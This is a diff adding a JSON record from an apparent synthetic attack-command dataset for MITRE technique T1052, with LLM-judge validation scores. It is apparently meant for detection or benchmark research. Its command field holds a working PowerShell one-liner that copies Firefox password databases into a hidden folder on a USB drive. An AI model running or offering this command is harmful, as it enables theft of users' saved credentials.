@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $dst=Join-Path $usb '.pkg'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; $src=\"$env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\"; if(Test-Path $src){ Get-ChildItem -Path $src -Recurse -Include logins.json, key4.db, places.sqlite -ErrorAction SilentlyContinue | Copy-Item -Destination $dst -Force }",
+  "explanation": "Copies select Firefox profile databases to a hidden folder on the removable drive using Copy-Item, staying entirely local.",
+  "rationale_steps": [
+    "Resolve USB drive via WMI",
+    "Create a hidden destination directory",
+    "Locate targeted browser profile artifacts",
+    "Copy results to USB using Copy-Item"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-afb253a5",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, proper separators, and valid cmdlets/parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a removable drive, creates a hidden directory, and copies targeted Firefox profile files there, aligning with exfiltration over physical media.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:54:00.792219Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced parentheses and valid cmdlet usage, though the -Include parameter with comma-separated values without quotes around each filename (e.g., `logins.json, key4.db` with spaces after commas) may cause issues in some PowerShell versions, and Copy-Item without a -Recurse flag when copying multiple files to a directory destination could behave unexpectedly.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by detecting a removable USB drive via WMI, creating a hidden staging directory on it, and copying Firefox credential files (logins.json, key4.db, places.sqlite) from the user profile — directly aligning with data staging and exfiltration over physical medium behavior.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:37:48.527546Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper PowerShell syntax, including correct cmdlets, variable assignments, piping, and conditional logic with balanced quoting and parentheses.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies removable drives, creates a hidden staging directory, and targets specific sensitive Firefox credential and history files, aligning perfectly with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:37:49.469923Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
